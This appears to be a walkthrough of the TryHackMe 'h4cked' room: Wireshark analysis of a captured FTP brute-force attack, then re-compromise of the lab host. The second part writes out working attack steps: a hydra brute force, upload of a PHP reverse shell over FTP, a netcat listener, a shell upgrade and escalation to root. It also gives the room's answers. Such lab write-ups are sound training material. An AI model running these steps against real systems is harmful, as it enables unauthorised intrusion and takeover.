h4cked is an easy difficulty room on TryHackMe. Below are the steps I followed to answer the questions for this box.

### Task 1

#### Question 1

![h4cked question 1](/images/h4cked1.png)

After downloading the pcapng file, open it up in Wireshark and then click on **Statistics** followed by **Protocol Hierarchy**. This will show you all the protocols utilized in this packet capture as shown below.

![h4cked Wireshark protocols](/images/h4cked2.png)

Based on this, there are two protocols utilized, HTTP and FTP. Let's close this window and in the filter toolbar, enter the following:

**`ftp`**

![h4cked Wireshark ftp filter](/images/h4cked3.png)

Next, right click on packet 49 (the first filtered packet) and select **Follow** and then **TCP Stream**

![h4cked Wireshark follow TCP stream](/images/h4cked4.png)

The window that pops up shows you that this service has attempts to login to it as shown below, so **FTP** is the answer to Question 1.

#### Question 2

This question asks you about a popular brute forcing tool.

![h4cked Question 2](/images/h4cked6.png)

A quick Google search for **Van Hauser brute force tool** will reveal the answer of **hydra**

#### Questions 3 and 4

![h4cked Questions 3 and 4](/images/h4cked8.png)

These can be found by following the steps in Question 1. Filtering Wireshark by ftp and then following the first TCP stream. This results in a username of **jenny** and a password of **password123**.

![h4cked Wireshark Questions 3 and 4](/images/h4cked9.png)

#### Questions 5 and 6

![h4cked Questions 5 and 6](/images/h4cked10.png)

In Wireshark, add the following as your filter:

**`ftp contains "PWD"`**

This filters out commands to only show FTP protocols that are running the PWD (print working directory) command. 

![h4cked Wireshark ftp PWD](/images/h4cked11.png)

Follow the TCP stream (as you did for prior questions) and you will see the server's response to the PWD request, which is the answer to question 5. Further in this TCP is the answer to Question 6 as well.

#### Question 7

![h4cked Question 7](/images/h4cked13.png)

Let's turn our focus to the ftp-data protocol in Wireshark and enter the following filter:

**`ftp-data"`**

![h4cked Wireshark ftp-data](/images/h4cked14.png)

As we have done previously, Follow the TCP dream for the 2nd packet listed (431).

#### Questions 8 - 13

![h4cked Questions 8-13](/images/h4cked16.png)

For these questions you can filter with the following in Wireshark:

**`frame contains "whoami"`**

I assumed whoami was the command used as it's one of the first commands ran to gather information once a foothold has been established.

![h4cked Wireshark frame filter](/images/h4cked17.png)

Once filtered, you can do another Follow TCP Stream to get answers to Questions 8 -13:

**Question 8**

![h4cked Question 8 answer](/images/h4cked18.png)

**Question 9**

![h4cked Question 9 answer](/images/h4cked19.png)

**Question 10**

![h4cked Question 10 answer](/images/h4cked20.png)

**Question 11**

![h4cked Question 11 answer](/images/h4cked21.png)

**Question 12**

![h4cked Question 12 answer](/images/h4cked22.png)

**Question 13**

This one is somewhat general knowledge, but a quick Google search will likely get your answer. The answer is **rootkit**.

### Task 2

There is only one question that needs an answer, which is reading the flag.txt file. Here are the steps to follow to root this host. First, let's run hydra on the jenny user with the following command on our attacker host.

**`hydra -t 10 -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.237.6  ftp`**

Where 10.10.237.6 is the victim host's IP address. After a few minutes you will uncover the new password for jenny.

![h4cked hydra](/images/h4cked23.png)

Great, now we know the FTP password for jenny. Let's download the reverse PHP shell located [here](https://github.com/pentestmonkey/php-reverse-shell). Save the file as **shell.php** in your user's home folder.

![h4cked reverse shell modification](/images/h4cked24.png)

Next, let's ftp as the jenny user over to our victim host from our attacker host using the password we uncovered. To initially connect, run:

**`ftp <victim ip>`**

![h4cked ftp connection](/images/h4cked25.png)

Next let's run:

**`bin`**

and

**`put shell.php`**

to change the mode to binary mode and upload the shell.

![h4cked upload reverse shell](/images/h4cked26.png)

On your attacker host, run the following to open up a listener to catch the reverse shell:

**`nc -nvlp 4444`**

![h4cked nc listener](/images/h4cked27.png)

Next, navigate to **http://\<attacker ip>/shell.php** and you should see a connection to your netcat listener.

![h4cked reverse shell connection](/images/h4cked28.png)

Next, let's get a fully interactive shell with the following python command:

**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**

![h4cked upgrade shell](/images/h4cked29.png)

You will notice we are running as the www-data user. Let's run:

**`su jenny`** to switch over to the jenny user and enter the password we uncovered earlier.

![h4cked su jenny](/images/h4cked30.png)

Next, let's run the following to change our privileges to root:

**`sudo su`**

![h4cked su root](/images/h4cked31.png)

Next, run the following commands to change to the root user's home directory, list that directory's contents, navigate to the Reptile subdirectory, list that directory's contents, and then display the flag.txt file.

**`cd /root`**

**`ls -al`**

**`cd Reptile`**

**`ls -al`**

**`cat flag.txt`**

![h4cked root.txt](/images/h4cked32.png)

And that is the end of this box! It has been fully compromised (again).
